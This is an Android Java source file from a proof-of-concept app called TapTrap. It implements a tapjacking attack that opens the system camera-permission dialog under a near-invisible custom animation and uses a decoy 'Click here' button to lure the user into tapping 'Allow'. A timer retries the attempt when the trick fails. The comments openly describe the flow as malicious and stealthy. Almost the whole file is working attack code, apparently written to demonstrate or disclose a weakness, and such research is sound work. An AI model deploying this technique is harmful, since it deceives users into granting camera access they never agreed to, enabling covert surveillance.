package click.taptrap.poc;

import android.app.ActivityOptions;
import android.content.Intent;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

/**
 * MainActivity is the main entry point of the TapTrap PoC application.
 *
 * This activity is responsible for stealthily requesting camera permissions and luring the user into granting them.
 * The malicious animation used for TapTrap (fade_in) can be found in res/anim/fade_in.xml.
 */
public class MainActivity extends AppCompatActivity {

    private TextView remainingTimeTextView;
    private TextView permissionGrantedTextView;
    private Button startButton;
    private Button clickHereButton;

    private boolean retry = false;
    private boolean granted = false;

    private final Handler handler = new Handler(Looper.getMainLooper());

    /**
     * Called by the Android framework when the activity is first created.
     */
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        overridePendingTransition(0,0);
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        // Get the TextViews and Buttons defined in res/layout/activity_main.xml
        remainingTimeTextView = findViewById(R.id.remainingTime);
        startButton = findViewById(R.id.startButton);
        clickHereButton = findViewById(R.id.clickHereButton);
        permissionGrantedTextView = findViewById(R.id.granted);

        startButton.setOnClickListener(v -> {
            // Executed when the 'Start' button is clicked
            startAttack();
        });
    }

    /**
     * Called by the Android framework when the activity is resumed (i.e, when the user opens the app or comes back to it).
     */
    @Override
    protected void onResume() {
        super.onResume();
        if (granted) {
            remainingTimeTextView.setText(R.string.permission_granted);
        } else if (retry) {
            remainingTimeTextView.setText(R.string.attack_retrying);
            handler.postDelayed(this::startAttack, 1000);
        } else {
            remainingTimeTextView.setText(R.string.attack_not_in_progress);
        }
    }

    /**
     * Registers that the camera permission has been granted.
     *
     */
    private void granted() {
        retry = false;
        granted = true;
        remainingTimeTextView.setText(R.string.permission_granted);
        startButton.setVisibility(Button.GONE);
        clickHereButton.setVisibility(Button.GONE);
        remainingTimeTextView.setVisibility(TextView.GONE);
        permissionGrantedTextView.setVisibility(TextView.VISIBLE);
    }

    /**
     * Called by the Android framework when the request permission activity returns, such as when the user presses the 'allow' button.
     */
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (resultCode == RESULT_OK) {
            // Permission granted
            granted();
        }
        super.onActivityResult(requestCode, resultCode, data);
    }

    /**
     * Starts the TapTrap attack flow.
     * Requests permissions to access the camera.
     */
    public void startAttack() {

        // Hide the 'Start' button and show the 'Click here' button
        startButton.setVisibility(Button.GONE);
        clickHereButton.setVisibility(Button.VISIBLE);

        // Creates an Intent to open the camera permission request screen
        Intent intent = new Intent("android.content.pm.action.REQUEST_PERMISSIONS");
        intent.putExtra("android.content.pm.extra.REQUEST_PERMISSIONS_NAMES", new String[]{"android.permission.CAMERA"});

        // Creates the custom animation for the activity transition
        ActivityOptions activityOptions = ActivityOptions.makeCustomAnimation(this, R.anim.fade_in, R.anim.fade_out);

        // Starts the camera permission request screen with the animation
        startActivityForResult(intent, 1, activityOptions.toBundle());

        // Update the remaining time text view every second and after 5.5 seconds, relaunch the MainActivity to hide the permission request screen
        new CountDownTimer(5500, 1000) {
            public void onTick(long millisUntilFinished) {
                if (!granted) {
                    remainingTimeTextView.setText(getString(R.string.attack_window_closes, millisUntilFinished / 1000));
                }
            }

            public void onFinish() {
                Intent mainActivityIntent = new Intent(MainActivity.this, MainActivity.class);
                if (!granted) {
                    retry = true;
                    clickHereButton.setVisibility(Button.GONE);
                    startActivity(mainActivityIntent);
                }
            }
        }.start();
    }
}